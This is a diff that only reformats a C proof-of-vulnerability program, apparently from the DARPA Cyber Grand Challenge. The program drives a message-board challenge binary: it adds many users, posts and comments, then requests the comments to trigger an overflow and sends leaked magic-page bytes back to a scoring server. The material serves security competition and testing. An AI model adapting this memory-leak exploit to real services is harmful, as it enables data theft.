@@ -24,200 +24,175 @@ THE SOFTWARE.
 
 */
 
-
 #include <libcgc.h>
-#include "stdlib.h"
+
 #include "stdio.h"
+#include "stdlib.h"
 #include "string.h"
 
-int receive_bytes (int fd, void *buffer, size_t count) 
-{
-size_t total;
-size_t rxbytes;
+int receive_bytes(int fd, void *buffer, size_t count) {
+  size_t total;
+  size_t rxbytes;
 
-    total = 0;
+  total = 0;
 
-    while(total < count)  {
+  while (total < count) {
+    rxbytes = 0;
 
-        rxbytes = 0;
-
-        if (receive(fd, buffer+total, count-total, &rxbytes)==0 ) {
-
-            total += rxbytes;
-
-        }
-        
-        else {
-
-            return(-1);
-        }
+    if (receive(fd, buffer + total, count - total, &rxbytes) == 0) {
+      total += rxbytes;
 
     }
 
-return 0;
+    else {
+      return (-1);
+    }
+  }
 
+  return 0;
 }
 
+int main(void) {
+  char buffer[1024];
+  int i;
 
-int main(void)
-{
+  int pov_type;
+  unsigned int type2_addr;
+  unsigned int type2_length;
+  unsigned int type2_size;
+  unsigned int new_offset_value;
 
-char buffer[1024];
-int i;
+  int retcode;
+  unsigned int userCode;
+  unsigned int postID;
 
-int pov_type;
-unsigned int type2_addr;
-unsigned int type2_length;
-unsigned int type2_size;
-unsigned int new_offset_value;
+  // negotiate a type 2 POV
+  pov_type = 2;
 
-int retcode;
-unsigned int userCode;
-unsigned int postID;
+  if (write(3, &pov_type, sizeof(pov_type)) == -1) _terminate(-1);
 
-	// negotiate a type 2 POV
-	pov_type = 2;
+  if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1) _terminate(-1);
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
-		_terminate(-1);
+  if (receive_bytes(3, &type2_size, sizeof(type2_size)) == -1) _terminate(-1);
 
-	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
-		_terminate(-1);
+  if (receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
+    _terminate(-1);
 
-	if (receive_bytes(3, &type2_size, sizeof(type2_size)) == -1)
-		_terminate(-1);
+  *(unsigned int *)buffer = 0xa0;
 
-	if (receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
-		_terminate(-1);
+  buffer[4] = 5;
 
+  for (i = 5; i < 149; ++i) buffer[i] = 'a';
 
-	*(unsigned int *)buffer = 0xa0;
+  buffer[10] = 1;
 
-	buffer[4] = 5;
+  buffer[12] = 138;
 
-	for (i=5; i < 149; ++i )
-		buffer[i] = 'a';
+  buffer[149] = 2;
+  buffer[150] = 1;
 
-	buffer[10] = 1;
+  // send the message to add the user
+  write(STDOUT, (void *)buffer, 151);
 
-	buffer[12] = 138;
+  receive_bytes(STDIN, &retcode, 4);
 
-	buffer[149] = 2;
-	buffer[150] = 1;
+  if (retcode != 0) {
+    printf("something is wrong\n");
+    _terminate(-1);
+  }
 
+  buffer[12] = 1;
 
-	// send the message to add the user
-	write(STDOUT, (void *)buffer, 151);
+  // now add a bunch of users to move the read pointer of the file mapped to the
+  // magic page towards the end
+  for (i = 0; i < 180; ++i) {
+    sprintf(buffer + 7, "$03d", i);
+    buffer[10] = 1;
 
-	receive_bytes(STDIN, &retcode, 4);
+    write(STDOUT, (void *)buffer, 14);
 
-	if (retcode != 0) {
+    receive_bytes(STDIN, &retcode, 4);
 
-		printf("something is wrong\n");
-		_terminate(-1);
-	}
+    if (retcode != 0) {
+      printf("something is wrong\n");
+      _terminate(-1);
+    }
+  }
 
-	buffer[12] = 1;
+  // now login as the first user
+  buffer[0] = 0xb0;
+  buffer[4] = 5;
 
-	// now add a bunch of users to move the read pointer of the file mapped to the magic page towards the end
-	for (i = 0; i < 180; ++i ) {
+  for (i = 5; i < 12; ++i) buffer[i] = 'a';
 
-		sprintf(buffer+7, "$03d", i);
-		buffer[10] = 1;
+  buffer[10] = 1;
 
-		write(STDOUT, (void *)buffer, 14);
+  // send the message to login the user
+  write(STDOUT, (void *)buffer, 12);
 
-		receive_bytes(STDIN, &retcode, 4);
+  // need to save the returned userCode for making posts
+  receive_bytes(STDIN, &userCode, 4);
 
-		if (retcode != 0) {
+  // time to make a first post
+  buffer[0] = 0xd0;
 
-			printf("something is wrong\n");
-			_terminate(-1);
-		}
-	}
+  *(unsigned int *)(buffer + 4) = userCode;
 
-	// now login as the first user
-	buffer[0] = 0xb0;
-	buffer[4] = 5;
+  // short n sweet message
+  buffer[8] = 1;
+  buffer[9] = 'a';
 
-	for (i=5; i < 12; ++i )
-		buffer[i] = 'a';
+  // send the message to make a post
+  write(STDOUT, (void *)buffer, 10);
 
-	buffer[10] = 1;
+  // return code is the post's ID
+  receive_bytes(STDIN, &postID, 4);
 
-	// send the message to login the user
-	write(STDOUT, (void *)buffer, 12);
+  // now make a comment on the post
+  buffer[0] = 0xe0;
 
-	// need to save the returned userCode for making posts
-	receive_bytes(STDIN, &userCode, 4);
+  *(unsigned int *)(buffer + 4) = postID;
+  *(unsigned int *)(buffer + 8) = userCode;
 
+  buffer[12] = 1;
+  buffer[13] = 'b';
 
-	// time to make a first post
-	buffer[0] = 0xd0;
+  write(STDOUT, (void *)buffer, 14);
 
-	*(unsigned int *)(buffer+4) = userCode;
+  // get the response to the comment
+  receive_bytes(STDIN, &retcode, 4);
 
-	// short n sweet message
-	buffer[8] = 1;
-	buffer[9] = 'a';
+  if (retcode != 0) {
+    write(2, "comment error\n", 14);
+  }
 
-	// send the message to make a post
-	write(STDOUT, (void *)buffer, 10);
+  // now request the specific message to get its comments, which should cause
+  // the overflow
+  buffer[0] = 0xf0;
 
-	// return code is the post's ID
-	receive_bytes(STDIN, &postID, 4);
+  *(unsigned int *)(buffer + 4) = postID;
 
+  write(STDOUT, (void *)buffer, 8);
 
-	// now make a comment on the post
-	buffer[0] = 0xe0;
+  // receive the first part of the response
+  receive_bytes(STDIN, buffer, 43);
 
-	*(unsigned int *)(buffer+4) = postID;
-	*(unsigned int *)(buffer+8) = userCode;
+  retcode = 0x8a;
+  // now receive the length of the commenter's name.  If its only 30 bytes, then
+  // this is the patched binary
+  receive_bytes(STDIN, &retcode, 4);
 
-	buffer[12] = 1;
-	buffer[13] = 'b';
+  if (retcode == 0x8a) {
+    write(2, "exploited", 9);
+    receive_bytes(STDIN, buffer, 0x8a + 5 + 8 + 8);
+    receive_bytes(STDIN, buffer, 54);
+  } else {
+    write(2, "patched binary\n", 15);
+  }
 
-	write(STDOUT, (void *)buffer, 14);
+  // now write the returned data back to the POV server for scoring
+  write(3, buffer + 50, 4);
 
-	// get the response to the comment
-	receive_bytes(STDIN, &retcode, 4);
-
-	if (retcode != 0 ) {
-
-		write(2, "comment error\n", 14);
-	}
-
-	// now request the specific message to get its comments, which should cause the overflow
-	buffer[0] = 0xf0;
-
-	*(unsigned int *)(buffer+4) = postID;
-
-	write(STDOUT, (void *)buffer, 8);
-
-
-	// receive the first part of the response
-	receive_bytes(STDIN, buffer, 43);
-
-	retcode = 0x8a;
-	// now receive the length of the commenter's name.  If its only 30 bytes, then this is the patched binary
-	receive_bytes(STDIN, &retcode, 4);
-
-	if ( retcode == 0x8a ) {
-
-		write(2, "exploited", 9);
-		receive_bytes(STDIN, buffer, 0x8a+5+8+8);
-		receive_bytes(STDIN, buffer, 54);
-	}
-	else {
-
-		write(2, "patched binary\n", 15);
-	}
-
-	// now write the returned data back to the POV server for scoring
-	write(3, buffer+50, 4);
-
-	// send the command to exit the CB
-	write(STDOUT, "exit", 4);
-
+  // send the command to exit the CB
+  write(STDOUT, "exit", 4);
 }
-
